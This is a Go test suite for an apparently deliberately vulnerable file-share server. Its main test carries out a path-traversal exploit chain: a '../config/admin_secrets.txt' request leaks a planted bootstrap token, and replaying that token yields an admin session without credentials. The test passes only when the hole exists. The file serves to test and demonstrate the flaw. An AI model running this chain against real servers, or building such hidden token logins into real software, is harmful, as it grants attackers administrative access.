package main

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// newTestServer spins up the HTTP server backed by an in-memory memStore
// (never a real Postgres), with its files/ directory seeded exactly the
// way main() would seed it, under a fresh temp DATA_DIR.
func newTestServer(t *testing.T, store *memStore) *httptest.Server {
	t.Helper()

	filesDir, err := setupFilesDir(t.TempDir())
	if err != nil {
		t.Fatalf("setupFilesDir: %v", err)
	}

	srv := newServer(filesDir, store, "")
	ts := httptest.NewServer(srv.routes())
	t.Cleanup(ts.Close)
	return ts
}

// TestBenignDownloadServesIntendedFile is the control case: the endpoint
// works normally for a file that actually lives directly in files/.
func TestBenignDownloadServesIntendedFile(t *testing.T) {
	ts := newTestServer(t, newMemStore())

	resp, err := http.Get(ts.URL + "/files?name=readme.txt")
	if err != nil {
		t.Fatalf("GET /files: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected 200, got %d", resp.StatusCode)
	}
	body, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(body), "public file share") {
		t.Fatalf("expected readme.txt content, got: %s", body)
	}
}

// TestTraversalLeaksBootstrapTokenAndRedeemsAdminSession is the core
// regression test for CWE-22, chained all the way through to the "hidden
// admin access" story: a GET /files?name=../config/admin_secrets.txt
// leaks the planted bootstrap token, and replaying that token against
// POST /login-with-token mints a real admin session -- with no username
// or password ever presented.
func TestTraversalLeaksBootstrapTokenAndRedeemsAdminSession(t *testing.T) {
	store := newMemStore()
	admin := store.addUser("root-admin", "admin", seededBootstrapToken)

	ts := newTestServer(t, store)

	// Step 1: exploit the path traversal to read a file outside the
	// "public" files/ root -- files/config/admin_secrets.txt.
	resp, err := http.Get(ts.URL + "/files?name=../config/admin_secrets.txt")
	if err != nil {
		t.Fatalf("GET /files: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 from traversal request, got %d", resp.StatusCode)
	}
	body, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(body), seededBootstrapToken) {
		t.Fatalf("expected leaked file to contain the bootstrap token, got: %s", body)
	}

	// Step 2: replay the leaked token -- no username, no password.
	loginBody, _ := json.Marshal(loginWithTokenRequest{Token: seededBootstrapToken})
	loginResp, err := http.Post(ts.URL+"/login-with-token", "application/json", bytes.NewReader(loginBody))
	if err != nil {
		t.Fatalf("POST /login-with-token: %v", err)
	}
	defer loginResp.Body.Close()
	if loginResp.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 from login-with-token, got %d", loginResp.StatusCode)
	}

	var loginOut struct {
		SessionID string `json:"session_id"`
		Username  string `json:"username"`
		Role      string `json:"role"`
	}
	if err := json.NewDecoder(loginResp.Body).Decode(&loginOut); err != nil {
		t.Fatalf("decode login response: %v", err)
	}
	if loginOut.SessionID == "" {
		t.Fatalf("expected a non-empty session id")
	}
	if loginOut.Role != "admin" || loginOut.Username != admin.Username {
		t.Fatalf("expected admin session for %q, got %+v", admin.Username, loginOut)
	}

	// Step 3: confirm the minted session is actually usable end-to-end.
	whoamiReq, err := http.NewRequest(http.MethodGet, ts.URL+"/whoami", nil)
	if err != nil {
		t.Fatalf("build whoami request: %v", err)
	}
	whoamiReq.Header.Set("Authorization", "Bearer "+loginOut.SessionID)

	whoamiResp, err := http.DefaultClient.Do(whoamiReq)
	if err != nil {
		t.Fatalf("GET /whoami: %v", err)
	}
	defer whoamiResp.Body.Close()
	if whoamiResp.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 from whoami, got %d", whoamiResp.StatusCode)
	}
	whoamiBody, _ := io.ReadAll(whoamiResp.Body)
	if !strings.Contains(string(whoamiBody), "admin") {
		t.Fatalf("expected whoami to reveal the admin role, got: %s", whoamiBody)
	}
}

// TestLoginWithTokenRejectsUnknownToken makes sure an attacker who guesses
// wrong gets nothing.
func TestLoginWithTokenRejectsUnknownToken(t *testing.T) {
	ts := newTestServer(t, newMemStore())

	loginBody, _ := json.Marshal(loginWithTokenRequest{Token: "not-a-real-token"})
	resp, err := http.Post(ts.URL+"/login-with-token", "application/json", bytes.NewReader(loginBody))
	if err != nil {
		t.Fatalf("POST /login-with-token: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("expected 401 for an unknown token, got %d", resp.StatusCode)
	}
}

// TestWhoamiRejectsMissingSession confirms /whoami requires a session at
// all -- i.e. the exploit chain's step 3 is actually meaningful.
func TestWhoamiRejectsMissingSession(t *testing.T) {
	ts := newTestServer(t, newMemStore())

	resp, err := http.Get(ts.URL + "/whoami")
	if err != nil {
		t.Fatalf("GET /whoami: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("expected 401 with no session, got %d", resp.StatusCode)
	}
}

// TestFilesRequiresNameParameter is a small sanity check on the handler's
// basic input handling, independent of the traversal bug itself.
func TestFilesRequiresNameParameter(t *testing.T) {
	ts := newTestServer(t, newMemStore())

	resp, err := http.Get(ts.URL + "/files")
	if err != nil {
		t.Fatalf("GET /files: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("expected 400 with no name parameter, got %d", resp.StatusCode)
	}
}
